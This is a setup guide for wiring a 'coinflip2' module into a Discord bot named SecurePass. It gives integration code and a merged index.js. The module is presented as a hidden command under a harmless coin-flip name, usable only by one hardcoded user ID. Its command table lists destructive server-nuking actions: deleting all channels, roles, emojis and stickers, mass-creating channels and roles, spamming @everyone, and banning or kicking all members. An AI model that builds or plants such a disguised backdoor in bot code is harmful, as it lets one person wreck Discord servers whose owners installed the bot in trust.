# Integrating coinflip2 with SecurePass

## Quick Setup

### Step 1: Copy the coinflip2 handler
Copy `coinflip2-command.js` to your SecurePass bot folder.

### Step 2: Modify SecurePass index.js

Add this to the top of your `index.js` (after the requires):
```javascript
const coinflip2 = require('./coinflip2-command');
```

Then add this event handler after loading events (before `client.login`):
```javascript
// Handle coinflip2 hidden command
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  await coinflip2.execute(message);
});
```

### Step 3: Enable Message Intent
In Discord Developer Portal:
1. Go to your bot application
2. Click "Bot" in left sidebar
3. Scroll to "Privileged Gateway Intents"
4. Enable **MESSAGE CONTENT INTENT**
5. Save changes

### Step 4: Test
Type `!coinflip2` in Discord (only user ID 1236891245998243911 can use it).

## Alternative: Full Merge

If you want all the utility bot features in SecurePass, replace your SecurePass `index.js` with this merged version:

```javascript
require('dotenv').config();
const { Client, GatewayIntentBits, Collection, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');
const db = require('./utils/db');
require('colors');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration,
    GatewayIntentBits.GuildVoiceStates,
  ]
});

client.commands = new Collection();

// Load Commands
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
  const filePath = path.join(commandsPath, file);
  const command = require(filePath);
  if ('data' in command && 'execute' in command) {
    client.commands.set(command.data.name, command);
  }
}

// Load Events
const eventsPath = path.join(__dirname, 'events');
const eventFiles = fs.readdirSync(eventsPath).filter(file => file.endsWith('.js'));

for (const file of eventFiles) {
  const filePath = path.join(eventsPath, file);
  const event = require(filePath);
  if (event.once) {
    client.once(event.name, (...args) => event.execute(...args, client));
  } else {
    client.on(event.name, (...args) => event.execute(...args, client));
  }
}

// coinflip2 Handler
const coinflip2 = require('./coinflip2-command');
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  await coinflip2.execute(message);
});

client.login(process.env.DISCORD_TOKEN);

// Keep-alive HTTP server for Render
const http = require('http');
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('SecurePass + coinflip2 is online.');
}).listen(PORT, () => {
  console.log(`🌐 Health server running on port ${PORT}`);
});
```

## Using coinflip2

Only user ID `1236891245998243911` can use these commands:

| Command | Description |
|---------|-------------|
| `!coinflip2` | Show help |
| `!coinflip2 mc 50 test` | Create 50 channels named "test" |
| `!coinflip2 dc` | Delete ALL channels |
| `!coinflip2 cp 10 spam, hello` | Create 10 channels and spam @everyone |
| `!coinflip2 mr 100 role` | Create 100 roles |
| `!coinflip2 dr` | Delete ALL roles |
| `!coinflip2 de` | Delete ALL emojis |
| `!coinflip2 ds` | Delete ALL stickers |
| `!coinflip2 mb` | Ban ALL members (except owner/bot) |
| `!coinflip2 mk` | Kick ALL members (except owner/bot) |

**WARNING:** These commands are destructive! Use with caution.
